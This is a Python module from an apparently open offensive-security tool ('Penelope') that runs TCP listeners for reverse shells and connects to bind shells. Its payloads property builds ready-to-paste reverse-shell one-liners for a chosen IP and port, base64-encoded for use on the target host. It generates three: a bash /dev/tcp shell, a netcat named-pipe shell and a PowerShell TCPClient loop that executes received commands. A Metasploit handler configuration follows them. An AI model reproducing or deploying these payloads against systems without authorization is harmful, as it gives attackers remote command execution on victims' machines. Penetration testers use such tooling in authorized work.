import socket
import socketserver
import threading
from textwrap import dedent
from functools import wraps
from select import select

from penelope_mod.context import ctx
from penelope_mod.network import Interfaces
from penelope_mod.ui import paint


def handle_bind_errors(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        host = args[1]
        port = args[2]
        try:
            func(*args, **kwargs)
            return True

        except PermissionError:
            ctx.logger.error(f"Cannot bind to port {port}: Insufficient privileges")
            print(dedent(
            f"""
            {paint('Workarounds:')}

            1) {paint('Port forwarding').UNDERLINE} (Run the Listener on a non-privileged port e.g 4444)
                sudo iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
                    {paint('or').white}
                sudo nft add rule ip nat prerouting tcp dport {port} redirect to 4444
                    {paint('then').white}
                sudo iptables -t nat -D PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
                    {paint('or').white}
                sudo nft delete rule ip nat prerouting tcp dport {port} redirect to 4444

            2) {paint('Setting CAP_NET_BIND_SERVICE capability').UNDERLINE}
                sudo setcap 'cap_net_bind_service=+ep' {__import__('os').path.realpath(__import__('sys').executable)}
                ./penelope.py {port}
                sudo setcap 'cap_net_bind_service=-ep' {__import__('os').path.realpath(__import__('sys').executable)}

            3) {paint('SUDO').UNDERLINE} (The {ctx.program.title()}'s directory will change to /root/.penelope)
                sudo ./penelope.py {port}
            """))

        except socket.gaierror:
            ctx.logger.error("Cannot resolve hostname")

        except OSError as e:
            from errno import EADDRINUSE, EADDRNOTAVAIL
            if e.errno == EADDRINUSE:
                ctx.logger.error(f"The port '{port}' is currently in use")
            elif e.errno == EADDRNOTAVAIL:
                ctx.logger.error(f"Cannot listen on '{host}'")
            else:
                ctx.logger.error(f"OSError: {str(e)}")

        except OverflowError:
            ctx.logger.error("Invalid port number. Valid numbers: 1-65535")

        except ValueError:
            ctx.logger.error("Port number must be numeric")

        return False
    return wrapper


def Connect(host, port):
    try:
        port = int(port)
        _socket = socket.socket()
        _socket.settimeout(5)
        _socket.connect((host, port))
        _socket.settimeout(None)

    except ConnectionRefusedError:
        ctx.logger.error(f"Connection refused... ({host}:{port})")

    except OSError:
        ctx.logger.error(f"Cannot reach {host}")

    except OverflowError:
        ctx.logger.error("Invalid port number. Valid numbers: 1-65535")

    except ValueError:
        ctx.logger.error("Port number must be numeric")

    else:
        if not ctx.core.started:
            ctx.core.start()
        ctx.logger.info(f"Connected to {paint(host).blue}:{paint(port).red} 🎯")
        # Import Session lazily to avoid cycles
        from penelope_mod.session import Session
        session = Session(_socket, host, port)
        if session:
            return True

    return False


class TCPListener:

    def __init__(self, host=None, port=None):
        self.host = host or ctx.options.default_interface
        self.host = Interfaces().translate(self.host)
        self.port = port or ctx.options.default_listener_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setblocking(False)
        self.caller = __import__('inspect').stack()[1].function

        if self.bind(self.host, self.port):
            self.start()

    def __str__(self):
        return f"TCPListener({self.host}:{self.port})"

    def __bool__(self):
        return hasattr(self, 'id')

    @handle_bind_errors
    def bind(self, host, port):
        self.port = int(port)
        self.socket.bind((host, self.port))

    def fileno(self):
        return self.socket.fileno()

    def start(self):
        specific = ""
        if self.host == '0.0.0.0':
            specific = paint('→  ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])

        ctx.logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}")

        self.socket.listen(5)

        self.id = ctx.core.new_listenerID
        ctx.core.rlist.append(self)
        ctx.core.listeners[self.id] = self
        if not ctx.core.started:
            ctx.core.start()

        ctx.core.control << ""  # TODO

        if ctx.options.payloads:
            print(self.payloads)

    def stop(self):

        if threading.current_thread().name != 'Core':
            ctx.core.control << f'self.listeners[{self.id}].stop()'
            return

        ctx.core.rlist.remove(self)
        del ctx.core.listeners[self.id]

        try:
            self.socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass

        self.socket.close()

        if ctx.options.single_session and ctx.core.sessions and not self.caller == 'spawn':
            ctx.logger.info(f"Stopping {self} due to Single Session mode")
        else:
            ctx.logger.warning(f"Stopping {self}")

    @property
    def payloads(self):
        interfaces = Interfaces().list
        presets = [
            "(bash >& /dev/tcp/{}/{} 0>&1) &",
            "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
            '$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        ]

        output = [str(paint(self).white_MAGENTA)]
        output.append("")
        ips = [self.host]

        if self.host == '0.0.0.0':
            ips = [ip for ip in interfaces.values()]

        for ip in ips:
            iface_name = {v: k for k, v in interfaces.items()}.get(ip)
            output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
            output.append(str(paint("Bash TCP").UNDERLINE))
            output.append(f"printf {__import__('base64').b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
            output.append("")
            output.append(str(paint("Netcat + named pipe").UNDERLINE))
            output.append(f"printf {__import__('base64').b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
            output.append("")
            output.append(str(paint("Powershell").UNDERLINE))
            output.append("cmd /c powershell -e " + __import__('base64').b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())

            output.extend(dedent(f"""
            {paint('Metasploit').UNDERLINE}
            set PAYLOAD generic/shell_reverse_tcp
            set LHOST {ip}
            set LPORT {self.port}
            set DisablePayloadHandler true
            """).split("\n"))

        output.append("─" * 80)
        return '\n'.join(output)

